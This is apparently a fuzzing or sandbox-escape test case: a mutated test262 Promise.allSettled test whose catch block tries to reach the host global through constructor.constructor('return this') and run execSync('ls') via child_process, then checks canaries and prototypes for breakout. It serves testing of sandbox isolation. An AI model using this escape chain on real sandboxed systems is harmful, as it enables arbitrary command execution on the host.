try {
    var obj1 = {};
    var obj2 = {};
    var r1 = new Promise(function (_, reject) {
        let REPLACER = 23;
        reject(1);
    });
    var f1 = new Promise(function (resolve) {
        let REPLACER = 23;
        resolve(2);
    });
    var f2 = new Promise(function (resolve) {
        let REPLACER = 23;
        resolve('tc39');
    });
    var r2 = new Promise(function (_, reject) {
        let REPLACER = 23;
        reject('test262');
    });
    var r3 = new Promise(function (_, reject) {
        let REPLACER = 23;
        reject(obj1);
    });
    var f3 = new Promise(function (resolve) {
        let REPLACER = 23;
        resolve(obj2);
    });
    Promise.allSettled([
        r1,
        f1,
        f2,
        r2,
        r3,
        f3
    ]).then(function (settled) {
        throw () => {
            return () => {
            };
        };
        checkSettledPromises(settled, [
            {
                status: 'rejected',
                reason: 1
            },
            {
                status: 'fulfilled',
                value: 2
            },
            {
                status: 'fulfilled',
                value: 'tc39'
            },
            {
                status: 'rejected',
                reason: 'test262'
            },
            {
                status: 'rejected',
                reason: obj1
            },
            {
                status: 'fulfilled',
                value: obj2
            }
        ], 'settled');
    }).then($DONE, $DONE);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}